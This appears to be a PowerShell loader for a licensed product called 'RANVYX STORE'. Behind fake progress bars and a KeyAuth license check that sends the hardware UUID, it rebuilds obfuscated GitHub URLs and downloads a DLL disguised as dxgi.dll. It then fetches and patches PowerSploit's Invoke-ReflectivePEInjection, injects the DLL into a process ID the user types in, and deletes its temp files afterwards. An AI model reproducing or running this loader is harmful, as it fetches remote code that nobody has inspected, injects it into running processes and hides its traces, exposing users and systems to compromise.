 # ===== ASCII LOGO =====
$logo = @"
RRRRR    AAA   N   N V   V Y   Y X   X
R    R  A   A  NN  N V   V  Y Y   X X 
RRRRR   AAAAA  N N N V   V   Y     X  
R   R   A   A  N  NN  V V    Y    X X 
R    R  A   A  N   N   V     Y   X   X

      R A N V Y X S T O R E
"@

# ===== GRADIENT COLORS =====
$colors = @(
    "Green",
    "Green",
    "Green"
)

# ===== SHOW LOGO (LEFT + GRADIENT + TYPE EFFECT) =====
function Show-Logo {
    Clear-Host

    $lines = $logo -split "`n"
    $colorIndex = 0

    foreach ($line in $lines) {
        $color = $colors[$colorIndex % $colors.Count]

        foreach ($char in $line.ToCharArray()) {
            Write-Host -NoNewline $char -ForegroundColor $color
            Start-Sleep -Milliseconds 1   # ปรับความเร็วได้
        }

        Write-Host ""
        $colorIndex++
    }
}

# ===== TYPE TEXT =====
function Type-Text($text, $color="White", $speed=3) {
    foreach ($char in $text.ToCharArray()) {
        Write-Host -NoNewline $char -ForegroundColor $color
        Start-Sleep -Milliseconds $speed
    }
    Write-Host ""
}

# ===== FAKE LOADING (CUSTOM BAR) =====
function Fake-Loading($text) {
    Write-Host ""
    Type-Text $text "Yellow" 2

    $barLength = 30
    for ($i = 0; $i -le $barLength; $i++) {
        $percent = [int](($i / $barLength) * 100)
        $bar = ("#" * $i).PadRight($barLength, "-")

        Write-Host -NoNewline "`r[$bar] $percent%" -ForegroundColor Green
        Start-Sleep -Milliseconds (Get-Random -Min 20 -Max 60)
    }

    Write-Host ""
}

# ===== CLEAN PRINT =====
function Print-Success($text) {
    Write-Host "[+] $text" -ForegroundColor Green
}

function Print-Error($text) {
    Write-Host "[-] $text" -ForegroundColor Red
}

# ===== START =====
Show-Logo

Write-Host ""
Write-Host "Enter License Key : " -NoNewline -ForegroundColor White
$key = Read-Host

# ===== KeyAuth =====
$appName  = "PWShell"
$ownerId  = "igr22xSE8H"
$version  = "1.0"
$apiUrl   = "https://keyauth.win/api/1.2/"

Fake-Loading "Connecting to server..."

$initBody = "type=init&ver=$version&name=$appName&ownerid=$ownerId"
$initResp = Invoke-RestMethod -Uri $apiUrl -Method Post -Body $initBody -ContentType "application/x-www-form-urlencoded"

if (-not $initResp.success) {
    Print-Error "Init failed"
    exit
}

$sessionId = $initResp.sessionid
$hwid = (Get-WmiObject Win32_ComputerSystemProduct).UUID

Fake-Loading "Verifying license..."

$licBody = "type=license&key=$([Uri]::EscapeDataString($key))&hwid=$([Uri]::EscapeDataString($hwid))&sessionid=$sessionId&name=$appName&ownerid=$ownerId"
$licResp = Invoke-RestMethod -Uri $apiUrl -Method Post -Body $licBody -ContentType "application/x-www-form-urlencoded"

if (-not $licResp.success) {
    Print-Error "Invalid key"
    exit
}

Print-Success "Login success"

$_0x91A = @(
"https://raw",
".githubusercontent",
".com/Reflexeiei885",
"/ranvyx/refs",
"/heads/main/",
"dxgi.dll"
) -join ""

$_0xB2F = Join-Path $env:TEMP (@("dbg","help",".dll") -join "")

Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force -ErrorAction SilentlyContinue

$_0x7C1 = New-Object (@("System",".Net",".WebClient") -join "")
$_0x7C1.Headers.Add((@("User","-Agent") -join ""), (@("Moz","illa/","5.0") -join ""))

$_0x5F9 = $_0x7C1.DownloadData($_0x91A)

$_0x3D2 = @(
"https://raw",
".githubusercontent",
".com/PowerShellMafia",
"/PowerSploit/master",
"/CodeExecution/",
"Invoke-ReflectivePEInjection.ps1"
) -join ""

$_0x8E4 = "$env:TEMP\Reflective_$(Get-Random).ps1"

Invoke-WebRequest -Uri $_0x3D2 -OutFile $_0x8E4 -UseBasicParsing

$_0xA77 = Get-Content $_0x8E4 -Raw

$_0xA77 = $_0xA77 -replace '\$GetProcAddress\s*=\s*\$UnsafeNativeMethods\.GetMethod\(''GetProcAddress''\)', '$GetProcAddress = $UnsafeNativeMethods.GetMethod(''GetProcAddress'', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))'

$_0xA77 = $_0xA77 -replace '\$GetModuleHandle\s*=\s*\$UnsafeNativeMethods\.GetMethod\(''GetModuleHandle''\)', '$GetModuleHandle = $UnsafeNativeMethods.GetMethod(''GetModuleHandle'', [Type[]]@([String]))'

$_0xC11 = "$env:TEMP\Reflective_fixed.ps1"

$_0xA77 | Set-Content $_0xC11 -Encoding UTF8

. $_0xC11

$_0x2AA = Read-Host (@("Enter"," PID") -join "")

Invoke-ReflectivePEInjection -PEBytes $_0x5F9 -ProcId $_0x2AA

notepad "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

Remove-Item $_0xB2F -Force -ErrorAction SilentlyContinue

Get-ChildItem (@("$env:TEMP","/Reflective_*.ps1") -join "") -ErrorAction SilentlyContinue |
Remove-Item -Force -ErrorAction SilentlyContinue
